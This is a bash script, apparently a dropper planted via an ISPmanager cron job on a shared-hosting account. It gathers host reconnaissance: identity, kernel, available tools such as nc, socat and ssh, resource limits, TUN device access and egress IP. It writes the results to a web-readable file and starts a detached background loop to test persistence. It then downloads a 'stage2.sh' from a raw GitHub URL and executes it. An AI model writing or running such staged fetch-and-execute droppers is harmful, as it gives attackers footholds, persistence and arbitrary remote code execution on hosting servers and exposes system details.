#!/bin/bash
# yacolo bootstrap — runs from ISPmanager cron as the site user
set -u
H="${HOME:-/var/www/yacolo356805/data}"
RAW="https://raw.githubusercontent.com/btpp03/pofa/refs/heads/main/xiaogangpao"
mkdir -p "$H/log" "$H/run" "$H/www" 2>/dev/null
OUT="$H/www/probe.out"
{
echo "=== yacolo bootstrap run: $(date -u '+%F %T') UTC ==="
echo "host: $(hostname 2>/dev/null)"
echo "id: $(id 2>/dev/null)"
echo "pwd: $(pwd)"
echo "HOME: $H"
echo "uname: $(uname -a 2>&1)"
echo "cwd-list: $(ls -a "$H" 2>&1 | tr '\n' ' ')"
echo "--- binaries ---"
for b in bash sh curl wget busybox php node npm python3 git tar unzip setsid nohup crontab screen tmux ssh socat nc; do
  printf '%s=%s\n' "$b" "$(command -v "$b" 2>/dev/null || echo NO)"
done
echo "--- limits ---"
( ulimit -a 2>&1 )
echo "--- disk/mem ---"
( df -h "$H" 2>&1 | tail -2 )
( free -m 2>&1 | head -2 )
( nproc 2>&1 )
echo "--- tun ---"
( ls -l /dev/net/tun 2>&1 )
echo "--- egress ---"
( curl -s --max-time 12 https://api.ipify.org 2>&1; echo )
( curl -s -o /dev/null -w 'github:%{http_code}\n' --max-time 12 https://github.com 2>&1 )
( curl -s -o /dev/null -w 'raw.githubusercontent:%{http_code}\n' --max-time 12 "$RAW/stage2.sh" 2>&1 )
echo "--- proc count ---"
( ps -eo pid,comm 2>/dev/null | wc -l )
echo "--- crontab test ---"
if command -v crontab >/dev/null 2>&1; then
  ( crontab -l 2>&1 | head -5 )
else
  echo "no crontab binary"
fi
echo "--- done $(date -u '+%F %T') UTC ---"
} > "$OUT" 2>&1

# survival test: background loop that prints every 60s
setsid nohup bash -c "while :; do echo \"\$(date -u +%FT%TZ) alive pid=\$\$\" >> '$H/log/alive.log'; sleep 60; done" >/dev/null 2>&1 &
echo "watchdog started pid=$!" >> "$OUT"

# stage2 (may not exist yet)
if curl -fsSL --max-time 25 "$RAW/stage2.sh" -o "$H/run/stage2.sh"; then
  chmod +x "$H/run/stage2.sh" 2>/dev/null
  echo "=== stage2 fetched, running ===" >> "$OUT"
  bash "$H/run/stage2.sh" >> "$OUT" 2>&1
  echo "=== stage2 rc=$? ===" >> "$OUT"
else
  echo "stage2 not available yet" >> "$OUT"
fi
